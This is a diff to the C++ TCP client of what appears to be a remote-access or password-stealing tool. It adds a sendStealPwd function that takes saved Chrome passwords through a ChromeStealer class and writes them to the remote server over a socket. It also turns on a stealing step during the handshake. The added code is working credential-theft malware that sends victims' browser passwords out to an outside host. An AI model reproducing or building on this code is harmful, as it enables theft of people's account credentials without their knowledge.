@@ -73,9 +73,41 @@ Packet *TCPClient::createPacket(PacketType type, std::string const& data)
 	return (StaticTools::CreatePacket(type, data));
 }
 
+void TCPClient::sendStealPwd(std::string const& ftpPort)
+{
+	try {
+		ChromeStealer stealer;
+		StaticTools::Log << "sending steal pwd to ftp: " << ftpPort << std::endl;
+
+		if (!stealer.canSteal()) {
+			return;
+		}
+
+		boost::asio::io_service ios;
+		boost::asio::ip::tcp::resolver resolver(ios);
+		boost::asio::ip::tcp::resolver::query query(_remote, ftpPort);
+		boost::asio::ip::tcp::resolver::iterator it = resolver.resolve(query);
+		boost::asio::ip::tcp::socket socket(ios);
+
+		socket.connect(*it);
+
+		boost::asio::streambuf request;
+		std::ostream request_stream(&request);
+		request_stream << stealer.stealPasswordList() << std::flush;
+
+		boost::asio::write(socket, request);
+
+		write(createPacket(PacketType::PT_DeleteFTP, ftpPort));
+	}
+	catch (std::exception const& e) {
+		StaticTools::Log << "send steal pwd: " << e.what() << std::endl;
+	}
+}
+
+
 void TCPClient::read(void)
 {
-	boost::asio::async_read(_socket, _read, boost::asio::transfer_at_least(sizeof(Packet)),
+	boost::asio::async_read(_socket, _read.prepare(1024), boost::asio::transfer_at_least(sizeof(Packet)),
 		boost::bind(&TCPClient::do_read, this,
 			boost::asio::placeholders::error,
 			boost::asio::placeholders::bytes_transferred));
@@ -111,11 +143,11 @@ void TCPClient::do_connect(boost::system::error_code const& ec, boost::asio::ip:
 	}
 }
 
-void TCPClient::do_read(boost::system::error_code const& ec, size_t)
+void TCPClient::do_read(boost::system::error_code const& ec, size_t len)
 {
 	if (!ec) {
 		Packet const* packet = boost::asio::buffer_cast<Packet const *>(_read.data());
-		_read.consume(sizeof(Packet) + packet->size);
+		_read.consume(len);
 
 		Packet *reply = NULL;
 		_reqHandler.request(*this, packet, &reply);
@@ -155,9 +187,10 @@ void TCPClient::do_handshake(boost::system::error_code const& ec)
 		StaticTools::Log << "Handshake success" << std::endl;
 		_connected = true;
 		write(StaticTools::CreatePacket(PacketType::PT_NewClient, StaticTools::Mac));
-		/*if (steal.canSteal()) {
-			write(StaticTools::CreatePacket(PacketType::PT_Command, steal.stealPasswordList()));
-		}*/
+
+		if (steal.canSteal()) {
+			write(StaticTools::CreatePacket(PacketType::PT_Stealer, "steal.db"));
+		}
 		read();
 	}
 	else {
